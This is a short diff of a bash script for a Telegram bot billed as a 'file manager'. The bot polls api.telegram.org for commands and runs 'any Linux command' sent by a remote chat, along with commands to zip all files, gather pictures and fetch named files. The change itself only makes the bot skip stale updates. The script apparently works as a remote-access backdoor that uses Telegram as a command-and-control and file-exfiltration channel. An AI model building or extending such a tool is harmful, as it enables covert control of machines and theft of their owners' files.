@@ -24,25 +24,29 @@ send_message() {
     curl -s -X POST "https://api.telegram.org/bot$T/sendMessage" -d "chat_id=$C&text=$message" > /dev/null 2>&1
 }
 
-# Initial message
+# Send the welcome message
 send_message "Welcome to the file manager bot! Use commands like 'ls', 'pwd', 'cd <dir>', 'zipall', 'pics', 'get <filename>', or type any Linux command."
+
+# Clear pending updates: fetch the latest update and set last_message_id so that old commands are ignored.
+initial_updates=$(curl -s "https://api.telegram.org/bot$T/getUpdates")
+last_message_id=$(echo "$initial_updates" | jq -r '.result | last | .message.message_id')
+if [[ "$last_message_id" == "null" || -z "$last_message_id" ]]; then
+    last_message_id=0
+fi
 
 # Initialize the working directory
 current_directory="$target_directory"
 
-# Keep track of the last processed message
-last_message_id=0
-
 # Main loop
 while true; do
-    # Fetch the latest updates
+    # Fetch the latest updates starting after the last processed message
     updates=$(curl -s "https://api.telegram.org/bot$T/getUpdates?offset=$((last_message_id + 1))")
 
     # Extract the latest message
     new_message_text=$(echo "$updates" | jq -r ".result[-1].message.text")
     new_message_id=$(echo "$updates" | jq -r ".result[-1].message.message_id")
 
-    # Check if there's a new command
+    # Process the new command only if it is not empty and hasn't been processed before
     if [[ -n "$new_message_text" && "$new_message_id" != "$last_message_id" ]]; then
         last_message_id="$new_message_id"
 
